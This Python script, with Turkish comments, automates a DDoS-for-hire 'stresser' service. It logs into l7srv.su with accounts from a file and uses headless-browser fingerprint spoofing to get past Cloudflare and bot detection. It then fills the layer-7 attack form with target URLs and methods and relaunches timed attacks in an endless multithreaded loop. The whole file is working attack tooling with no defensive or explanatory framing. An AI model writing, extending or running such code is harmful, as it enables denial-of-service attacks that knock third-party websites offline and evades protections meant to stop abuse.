import threading
import time
import os
import sys
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

ACCOUNTS_FILE = "accounts.txt"
MAX_CONCURRENT = 2

def load_accounts():
    accounts = []
    if not os.path.exists(ACCOUNTS_FILE):
        print(f"❌ {ACCOUNTS_FILE} bulunamadı! Örnek hesap ile devam ediliyor.")
        return [{"id": "1", "user": "dummy", "pass": "dummy", "url": "https://example.com", "method": "browser-free"}]

    with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
        for idx, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            parts = line.split(":", 2)
            if len(parts) < 3:
                print(f"⚠️ Geçersiz satır: {line}")
                continue
            user, pwd, rest = parts[0], parts[1], parts[2]
            if ":" in rest:
                url, method = rest.rsplit(":", 1)
            else:
                url = rest
                method = "browser-free"
            accounts.append({
                "id": str(idx),
                "user": user,
                "pass": pwd,
                "url": url,
                "method": method
            })
    return accounts

def attack_worker(account):
    username = account["user"]
    password = account["pass"]
    target_url = account["url"]
    method = account["method"]
    profile_dir = os.path.join(os.getcwd(), f"browser_profiles/profile_{username}")
    os.makedirs(profile_dir, exist_ok=True)

    print(f"[{username}] 🚀 Başlatılıyor | Hedef: {target_url} | Method: {method}")
    consecutive_errors = 0

    while True:
        try:
            with sync_playwright() as p:
                # Cloudflare'i aşmak için gelişmiş argümanlar
                context = p.chromium.launch_persistent_context(
                    user_data_dir=profile_dir,
                    headless=True,
                    viewport={"width": 1280, "height": 720},
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                    args=[
                        "--no-sandbox",
                        "--disable-dev-shm-usage",
                        "--disable-gpu",
                        "--disable-blink-features=AutomationControlled",
                        "--disable-features=IsolateOrigins,site-per-process",
                        "--disable-web-security",
                        "--disable-features=BlockInsecurePrivateNetworkRequests",
                        "--disable-features=OutOfBlinkCors",
                        "--disable-site-isolation-trials"
                    ],
                    ignore_default_args=["--enable-automation"],
                    slow_mo=50
                )
                page = context.new_page()
                
                # WebDriver tespitini atlatmak için init script
                page.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                    Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                    Object.defineProperty(navigator, 'platform', {get: () => 'Win32'});
                    Object.defineProperty(window, 'chrome', {get: () => {}});
                    Object.defineProperty(window, 'navigator', {value: window.navigator, writable: false});
                """)

                # ---------- CLOUDFLARE AŞMA ----------
                print(f"[{username}] 🔐 Giriş sayfasına gidiliyor (URL: https://l7srv.su/login)...")
                try:
                    response = page.goto("https://l7srv.su/login", timeout=60000, wait_until="domcontentloaded")
                    
                    if response and response.status == 403:
                        print(f"[{username}] 🛑 403 Forbidden - Cloudflare veya WAF tarafından engelleniyor olabilir.")
                        print(f"[{username}] ⏳ Cloudflare bekleme sayfası kontrol ediliyor...")
                        
                        # Cloudflare 5 saniye bekleme sayfası varsa bekleyip geç
                        try:
                            page.wait_for_selector("#challenge-running", timeout=5000)
                            print(f"[{username}] ☁️ Cloudflare challenge tespit edildi, bekleniyor...")
                            page.wait_for_selector("#challenge-success", timeout=30000)
                            print(f"[{username}] ✅ Cloudflare challenge geçildi!")
                            time.sleep(2)
                            # Sayfayı yeniden yükle
                            page.reload()
                            page.wait_for_load_state("networkidle", timeout=30000)
                        except:
                            print(f"[{username}] ⚠️ Cloudflare challenge bulunamadı, direkt devam ediliyor.")
                        
                        # Tekrar kontrol et
                        response = page.goto("https://l7srv.su/login", timeout=30000, wait_until="domcontentloaded")
                        if response and response.status == 403:
                            raise Exception("HTTP 403 hala devam ediyor, Cloudflare aşılamadı.")
                        else:
                            print(f"[{username}] ✅ Cloudflare aşıldı, HTTP {response.status}")
                    
                    # Sayfa başarıyla yüklendiyse devam et
                    if response and response.status == 200:
                        print(f"[{username}] ✅ Sayfa yüklendi. HTTP {response.status}")
                    else:
                        print(f"[{username}] ⚠️ Beklenmeyen HTTP durumu: {response.status if response else 'Yok'}")
                    
                    # DOM yüklendi mi kontrol et
                    page.wait_for_load_state("domcontentloaded", timeout=10000)
                    time.sleep(1)

                    # ---------- FORM DOLDUR ----------
                    print(f"[{username}] 📝 Form dolduruluyor...")
                    page.fill("#username", username)
                    page.fill("#password", password)

                    # Buton aktif olana kadar bekle
                    print(f"[{username}] ⏳ Buton aktifleşmesi bekleniyor...")
                    page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=15000)
                    
                    # Mouse hareketi yap (bot olmadığını göster)
                    page.mouse.move(100, 100)
                    time.sleep(0.5)
                    page.mouse.click(100, 100)
                    
                    # Butona tıkla
                    page.click("#loginNextBtn")
                    print(f"[{username}] 🖱️ Butona tıklandı.")

                    # Dashboard'a yönlenene kadar bekle
                    page.wait_for_url(lambda url: "/dash" in url, timeout=60000)
                    print(f"[{username}] ✅ Giriş başarılı, dashboard'a yönlendirildi.")
                    consecutive_errors = 0

                except PlaywrightTimeout as timeout_err:
                    print(f"[{username}] ❌ Zaman aşımı: {timeout_err}")
                    try:
                        current_url = page.url
                        print(f"[{username}] 📍 Mevcut URL: {current_url}")
                    except:
                        pass
                    context.close()
                    consecutive_errors += 1
                    wait_time = 30 if consecutive_errors < 3 else 120
                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
                    time.sleep(wait_time)
                    continue
                except Exception as login_err:
                    print(f"[{username}] ❌ Giriş hatası: {login_err}")
                    context.close()
                    consecutive_errors += 1
                    wait_time = 30 if consecutive_errors < 3 else 120
                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
                    time.sleep(wait_time)
                    continue

                # ---------- STRESS SAYFASI ----------
                print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                try:
                    response = page.goto("https://l7srv.su/dash/stress", timeout=30000, wait_until="domcontentloaded")
                    if response:
                        print(f"[{username}] ✅ Stress sayfası yüklendi. HTTP {response.status}")
                    page.wait_for_load_state("domcontentloaded", timeout=10000)
                    time.sleep(2)
                    if page.locator("#layer_7").count() == 0:
                        print(f"[{username}] ⚠️ #layer_7 bulunamadı, belki farklı bir sekme?")
                    else:
                        page.locator("#layer_7").click()
                        print(f"[{username}] ✅ #layer_7 tıklandı.")
                    consecutive_errors = 0
                except Exception as stress_err:
                    print(f"[{username}] ❌ Stress sayfası hatası: {stress_err}")
                    context.close()
                    consecutive_errors += 1
                    wait_time = 30 if consecutive_errors < 3 else 120
                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
                    time.sleep(wait_time)
                    continue

                # ---------- ANA SALDIRI DÖNGÜSÜ ----------
                while True:
                    try:
                        page.fill("#l7host", target_url, timeout=15000)
                        page.select_option("#l7method", value=method, timeout=10000)
                        time_value = 120 if method == "browser-free" else 200
                        page.fill("#l7time", str(time_value), timeout=10000)
                        page.click("#l7btn", timeout=10000)
                        print(f"[{username}] 🔥 Saldırı başladı | {time_value} sn")
                        consecutive_errors = 0

                        while True:
                            no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                            if no_attacks.count() > 0 and no_attacks.is_visible():
                                print(f"[{username}] ⏰ Saldırı bitti.")
                                break
                            expire_cell = page.locator("#attacks-table tbody tr td:nth-child(4) span").first
                            if expire_cell.count() > 0:
                                expire_text = expire_cell.text_content().strip()
                                if expire_text in ["00:00:00", "0"] or expire_text.lower() == "expired":
                                    print(f"[{username}] ⏰ Süre doldu.")
                                    break
                            time.sleep(2)

                        page.reload()
                        page.wait_for_load_state("domcontentloaded", timeout=30000)
                        time.sleep(2)
                        page.locator("#layer_7").click()
                        time.sleep(1)

                    except Exception as inner_err:
                        print(f"[{username}] ⚠️ Adım hatası: {inner_err}")
                        consecutive_errors += 1
                        try:
                            page.reload()
                            time.sleep(5)
                        except:
                            pass
                        continue

        except Exception as outer_err:
            print(f"[{username}] 💥 Kritik hata: {outer_err}")
            consecutive_errors += 1
            time.sleep(30)

if __name__ == "__main__":
    print("🚀 Başlatılıyor...")
    accounts = load_accounts()
    print(f"✅ {len(accounts)} hesap yüklendi.")

    semaphore = threading.Semaphore(MAX_CONCURRENT)
    def worker_wrapper(acc):
        with semaphore:
            attack_worker(acc)

    threads = []
    for acc in accounts:
        t = threading.Thread(target=worker_wrapper, args=(acc,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(2)

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("🛑 Kapatılıyor.")
        sys.exit(0)
